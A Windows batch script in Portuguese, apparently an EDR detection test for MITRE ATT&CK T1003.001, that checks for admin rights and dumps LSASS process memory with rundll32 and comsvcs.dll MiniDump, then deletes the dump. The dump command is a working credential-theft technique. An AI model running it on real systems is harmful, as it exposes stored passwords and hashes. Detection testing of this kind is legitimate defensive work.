@echo off
chcp 65001 >nul
title [01] Coleta de Credenciais (LSASS) - Validacao EDR
color 0C
cls
echo ============================================================
echo   [01] COLETA DE CREDENCIAIS - DUMP DO LSASS
echo   MITRE ATT&CK: T1003.001  ^|  Severidade: CRITICA
echo ============================================================
echo.
echo   Simula o roubo de senhas da memoria do Windows usando
echo   rundll32 + comsvcs.dll (ferramentas nativas).
echo.
echo   Requer PROMPT COMO ADMINISTRADOR. Apenas em LAB ISOLADO.
echo ============================================================
echo.
pause

net session >nul 2>&1
if %errorlevel% NEQ 0 (
  echo [ERRO] Execute este script como ADMINISTRADOR.
  echo.
  pause
  exit /b 1
)

if not exist "C:\temp" mkdir "C:\temp"

echo.
echo [*] Descobrindo o PID do lsass.exe...
for /f "tokens=2" %%P in ('tasklist /fi "imagename eq lsass.exe" /nh') do set LSASS_PID=%%P
echo     PID do LSASS = %LSASS_PID%

echo.
echo [*] Gerando dump da memoria do LSASS (comportamento malicioso)...
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %LSASS_PID% C:\temp\lsass.dmp full

echo.
if exist "C:\temp\lsass.dmp" (
  echo [OK] Dump criado em C:\temp\lsass.dmp
) else (
  echo [!] O dump nao foi criado. O EDR pode ter BLOQUEADO a acao - otimo sinal!
)

echo.
echo ------------------------------------------------------------
echo   Agora verifique o ALERTA no console do seu EDR.
echo   Esperado: acesso ao LSASS / credential dumping (CRITICO).
echo ------------------------------------------------------------
echo.
echo [*] Limpando o arquivo de dump...
del /q "C:\temp\lsass.dmp" >nul 2>&1
echo [OK] Limpeza concluida.
echo.
pause
